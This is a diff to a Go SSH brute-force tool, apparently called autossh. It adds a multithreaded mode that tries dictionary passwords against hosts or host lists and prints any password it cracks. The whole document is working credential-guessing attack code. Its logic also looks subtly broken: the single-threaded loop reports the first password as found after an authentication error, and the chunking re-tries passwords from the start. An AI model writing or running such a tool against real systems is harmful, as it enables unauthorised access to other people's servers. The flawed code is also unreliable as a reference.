@@ -7,6 +7,7 @@ import (
 	"log"
 	"math"
 	"os"
+	"sync"
 
 	"github.com/cfschilham/autossh/internal/loadcfg"
 	"github.com/cfschilham/autossh/internal/sshconn"
@@ -28,26 +29,89 @@ func inStrSlc(str string, slc []string) bool {
 	return false
 }
 
-// dictAttack attempts to establish an SSH connection with the given parameters and returns a
-// non-empty password string and a nil error in case of a successful connection. A non-nil error means an unsuccessful
-// authentication.
-func dictAttack(h loadcfg.Host, dict *loadcfg.Dict, port string, verbose bool) (string, error) {
-	for _, pwd := range dict.Pwds() {
-		if verbose {
-			fmt.Printf("Trying to connect with password '%s'\n", pwd)
+// wgToChan takes a waitgroup and returns a chan with the integer 1 when `wg.Wait()` has finished.
+func wgToChan(wg *sync.WaitGroup) chan int {
+	c := make(chan int, 1)
+	go func(wg *sync.WaitGroup, c chan int) {
+		wg.Wait()
+		c <- 1
+	}(wg, c)
+	return c
+}
+
+func sshDictMT(host loadcfg.Host, pwds []string, config *loadcfg.Config) (string, error) {
+	// Define channel for passing found password and waitgroup for
+	// when all goroutines return nothing (because of an error).
+	foundPwd := make(chan string, 1)
+	var wg sync.WaitGroup
+	wg.Add(len(pwds))
+
+	for _, pwd := range pwds {
+		if config.Verbose() {
+			fmt.Printf("Trying to connect with password %s\n", pwd)
 		}
-		if err := sshconn.SSHConn(h.IP(), h.Username(), port, pwd); err != nil {
-			// If the non-nil error is not an auth error an error is returned because this means it does not have anything to do with the
-			// password being wrong. If it is an auth error, however, we simply move on to the next pwd in dict.Pwds()
-			if !inStrSlc(err.Error(), authErrs) {
-				return "", err
+
+		go func(foundPwd chan string, host loadcfg.Host, pwds []string, port, pwd string) {
+			defer wg.Done()
+			if err := sshconn.SSHConn(host.IP(), host.Username(), port, pwd); err != nil {
+				return
 			}
+			foundPwd <- pwd
+		}(foundPwd, host, pwds, config.Port(), pwd)
+	}
+	select {
+	case pwd := <-foundPwd:
+		return pwd, nil
+	case <-wgToChan(&wg):
+		return "", errors.New("main: failed to authenticate")
+	}
+}
+
+func sshDict(host loadcfg.Host, dict *loadcfg.Dict, config *loadcfg.Config) (string, error) {
+	if config.MultiThreaded() { // Multi threaded.
+
+		for i := config.MaxConns(); i < len(dict.Pwds()); i += config.MaxConns() {
+			if pwd, err := sshDictMT(host, dict.Pwds()[:i], config); err != nil {
+
+				// If this is the last password in the dictionary, we don't need
+				// to go though the rest of the passwords which remain after all
+				// chunks of length `config.MaxConns()` have been completed
+				if i == len(dict.Pwds())-1 {
+					return "", err
+				}
+
+			} else {
+				return pwd, nil
+			}
+		}
+
+		// Go through the last few passwords, where the previous loop left off.
+		startIdx := len(dict.Pwds()) - (len(dict.Pwds()) % config.MaxConns())
+		if pwd, err := sshDictMT(host, dict.Pwds()[startIdx:], config); err != nil {
+			return "", err
 		} else {
 			return pwd, nil
 		}
+
+	} else { //Not multithreaded.
+
+		for _, pwd := range dict.Pwds() {
+			if config.Verbose() {
+				fmt.Printf("Trying to connect with password '%s'\n", pwd)
+			}
+			if err := sshconn.SSHConn(host.IP(), host.Username(), config.Port(), pwd); err != nil {
+				// If the non-nil error is not an auth error an error is returned because this means it does not have anything to do with the
+				// password being wrong. If it is an auth error, however, we simply move on to the next pwd in dict.Pwds()
+				if !inStrSlc(err.Error(), authErrs) {
+					return "", err
+				}
+			}
+			return pwd, nil
+		}
+		// If this point is reached all passwords in the dictionary have been tried and all returned an auth error.
+		return "", errors.New("main: failed to authenticate with dictionary")
+
 	}
-	// If this point is reached all passwords in the dictionary have been tried and all returned an auth error.
-	return "", errors.New("main: failed to authenticate with dictionary")
 }
 
 func main() {
@@ -88,19 +152,19 @@ func main() {
 			}
 
 			// Use user input to create a new Host struct
-			h, err := loadcfg.StrToHost(input, config.UsrIsHost())
+			host, err := loadcfg.StrToHost(input, config.UsrIsHost())
 			if err != nil {
 				log.Println(err.Error())
 				continue
 			}
 
-			fmt.Printf("Attempting to connect to '%s@%s'...\n", h.Username(), h.IP())
-			pwd, err := dictAttack(h, dict, config.Port(), config.Verbose())
+			fmt.Printf("Attempting to connect to '%s@%s'...\n", host.Username(), host.IP())
+			pwd, err := sshDict(host, dict, config)
 			if err != nil {
 				log.Println(err.Error())
 				continue
 			}
-			fmt.Printf("Password of '%s' found: %s\n", h.Username()+"@"+h.IP(), pwd)
+			fmt.Printf("Password of '%s' found: %s\n", host.Username()+"@"+host.IP(), pwd)
 		}
 
 	case "hostlist":
@@ -115,7 +179,7 @@ func main() {
 		for i, host := range hSlc {
 			fmt.Printf("%d%% done\n", int(math.Round(float64(i)/float64(len(hSlc))*100)))
 			fmt.Printf("Attempting to connect to '%s@%s'...\n", host.Username(), host.IP())
-			pwd, err := dictAttack(host, dict, config.Port(), config.Verbose())
+			pwd, err := sshDict(host, dict, config)
 			if err != nil {
 				log.Println(err.Error())
 				continue
